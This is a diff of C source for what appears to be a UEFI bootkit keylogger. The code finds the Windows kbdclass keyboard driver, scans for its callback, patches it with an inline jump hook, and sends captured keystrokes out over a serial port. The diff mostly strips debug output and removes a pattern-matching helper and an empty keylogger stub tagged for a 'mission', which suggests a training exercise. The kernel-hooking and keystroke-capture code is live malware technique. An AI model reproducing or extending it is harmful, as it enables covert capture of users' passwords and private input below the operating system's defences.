@@ -190,35 +190,6 @@ VOID* EFIAPI FindNtosExportByName(VOID *kernelBase , CHAR8* exportName)
     return NULL;
 }
 
-//find function according to important bytes
-VOID* FindPatternMask(IN VOID*  Base, IN UINTN  Size, IN UINT8* Pattern, IN CHAR8* Mask)
-{
-    if (!Base || !Pattern || !Mask || Size == 0) 
-        return NULL;
-    UINT8* Start = (UINT8*)Base;
-    UINTN PatternLen = AsciiStrLen(Mask);
-    if (PatternLen == 0 || PatternLen > Size)
-        return NULL;
-
-    for (UINTN i = 0; i <= Size - PatternLen; i++)
-    {
-        BOOLEAN Found = TRUE;
-        for (UINTN j = 0; j < PatternLen; j++)
-        {
-            if (Mask[j] == '?') 
-                continue;
-            if (Start[i + j] != Pattern[j]) 
-            {
-                Found = FALSE;
-                break;
-            }
-        }
-        if (Found)
-            return (VOID*)(Start + i);
-    }
-    return NULL;
-}
-
 
 PKLDR_DATA_TABLE_ENTRY FindKbdclassModule()
 {
@@ -271,9 +242,6 @@ VOID EFIAPI CheckDriverCallback(UNICODE_STRING* DriverName)
     if (!DriverName || !DriverName->Buffer)
         return;
 
-    SerialWrite("Loading: ");
-    SerialWriteUnicode(DriverName);
-
     if (IsKeyboardDriverName(DriverName))
     {
         if (!g_KeyboardFound)
@@ -291,10 +259,6 @@ VOID EFIAPI CheckDriverCallback(UNICODE_STRING* DriverName)
     }
 }
 
-//not in use for now, for misson 5
-void MyKeyLogger(void* DataStart, void* DataEnd) {
-    
-}
 
 BOOLEAN GetTextSection(VOID* ImageBase, VOID** TextBase, UINT32* TextSize)
 {
@@ -335,7 +299,7 @@ VOID* FindKeyboardCallback( VOID* TextBase, UINT32 TextSize)
     PVOID targetAddress = FindPattern(TextBase, TextSize, pattern, sizeof(pattern));
     if (targetAddress != NULL) {
     SerialWrite("Found potential function! Dumping first 16 bytes:\r\n");
-    DumpBytesInline(targetAddress, 16);
+    //DumpBytesInline(targetAddress, 16);
     } 
 
     else {
@@ -417,6 +381,7 @@ VOID EFIAPI MyKeyboardCallbackHook(VOID* DeviceObject, KEYBOARD_INPUT_DATA* Inpu
             SerialWrite(string);
         }
     }
+}
 
 // NT_SUCCESS(status = NtInitiatePowerAction(
 //         2,
@@ -441,7 +406,7 @@ VOID EFIAPI MyKeyboardCallbackHook(VOID* DeviceObject, KEYBOARD_INPUT_DATA* Inpu
     // UINT8 jmpInstructions[14] = { 0xFF, 0x25, 0x00, 0x00, 0x00, 0x00, 0,0,0,0,0,0,0,0 };
     // *(UINT64*)(&jmpInstructions[6]) = (UINT64)g_VirtualKbdHookPtr;
     // WriteHook(g_TargetKbdAddr, jmpInstructions, 14);
-}
+
 
 VOID ScanForKeyboardDriver()
 {
@@ -453,7 +418,6 @@ VOID ScanForKeyboardDriver()
     }
     g_KbdBaseAddress = module->DllBase;
     SerialWrite("\n\r****************************************\n\r");
-    SerialWrite(">>> SUCCESS! FOUND KBDCLASS BASE <<<\n\r");
     SerialWrite("Base Address: ");
     SerialWriteHex((UINT64)g_KbdBaseAddress);
     SerialWrite("****************************************\n\r\n\r");
@@ -478,8 +442,8 @@ VOID ScanForKeyboardDriver()
     {
         SerialWrite("Candidate callback:\n\r");
         SerialWriteHex((UINT64)callback);
-        SerialWrite("About to read memory...\n\r");
-        DumpBytesInline(callback, 64);
+        //SerialWrite("About to read memory...\n\r");
+        //DumpBytesInline(callback, 64);
     }
     if (!callback)
     {
@@ -498,10 +462,6 @@ EFI_STATUS InstallPureAsmHook(VOID* TargetFunction)
 
     g_OriginalMmAddress = (UINT64)TargetFunction;
     UINT8* ptr = (UINT8*)TargetFunction;
-    SerialWrite("Raw function bytes:\n");
-    for (int i = 0; i < 24; i++) {
-        SerialWriteHex(ptr[i]);
-    }
 
     UINT8 HookPatch[13] = {
         0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov r10, HookEntry
